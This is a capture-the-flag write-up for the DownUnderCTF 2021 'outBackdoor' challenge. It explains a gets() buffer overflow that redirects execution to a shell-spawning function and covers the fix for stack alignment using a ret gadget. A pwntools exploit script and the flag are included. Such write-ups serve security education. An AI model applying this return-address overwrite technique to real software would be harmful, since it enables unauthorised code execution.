# outBackdoor

![](/2021/DownUnderCTF2021/outBackdoor/images/1.png)

Checking the file and protection

![](/2021/DownUnderCTF2021/outBackdoor/images/2.png)

Use IDA to reverse

![](/2021/DownUnderCTF2021/outBackdoor/images/3.png)

This is a basic buffer overflow challenge, the gets function allow us to input more than 16 byte and overwrite the return address of main function. 

Look at the program, we see another function `outBackdoor`, which run `system(“/bin/sh”)` and give us the shell.

![](/2021/DownUnderCTF2021/outBackdoor/images/4.png)

So because the ELF have no PIE, so we just need to overwrite return address of main function to address of outBackdoor

![](/2021/DownUnderCTF2021/outBackdoor/images/5.png)

Address of `outBackdoor` is `0x4011d7`

There is another thing in this challenge that you need to pay attention to, that the server running this challange is ubuntu 64 bit, so when running a function, rsp needs to align with 16 bytes of padding. In other words, rsp & 0xf must be 0 .Just overwrite the main return address with address of outBackdoor causes rsp to not satisfy the above condition. With cause you segment fault. To fix it, simply push before it a ret_gadget. Do nothing but return to the next value on the stack, the address of `outBackdoor`, so because the stack pop 2 times, rsp & 0xf == 0. And the exploit will work on remote server.

The ret_gadget find with ROPgadget tool

![](/2021/DownUnderCTF2021/outBackdoor/images/6.png)

File [solve.py](/2021/DownUnderCTF2021/outBackdoor/solve.py)

```python
from pwn import *
s = remote('pwn-2021.duc.tf', 31921)
outBackdoor = 0x4011d7
ret = 0x401016
payload = b'A' * 24 + p64(ret) + p64(outBackdoor)
s.sendline(payload)
s.interactive()
```

![](/2021/DownUnderCTF2021/outBackdoor/images/7.png)

`flag: DUCTF{https://www.youtube.com/watch?v=XfR9iY5y94s}`



